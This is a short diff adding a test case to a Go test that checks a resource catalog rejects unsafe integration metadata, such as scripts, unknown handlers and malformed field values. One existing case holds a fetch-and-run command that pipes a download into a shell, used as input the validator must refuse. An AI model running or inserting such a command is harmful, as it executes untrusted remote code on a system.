@@ -77,6 +77,7 @@ func TestIntegrationCatalogRejectsScriptsAndUnknownHandlers(t *testing.T) {
 		func(item *model.Resource) { item.Metadata["integration.script"] = "curl example.test | sh" },
 		func(item *model.Resource) { item.Metadata["integration.handler"] = "catalog-hook" },
 		func(item *model.Resource) { item.Metadata["integration.fields"] = "{" },
+		func(item *model.Resource) { item.Metadata["integration.fields"] = `{"/~2":"x"}` },
 	} {
 		item := base
 		item.Metadata = maps.Clone(base.Metadata)
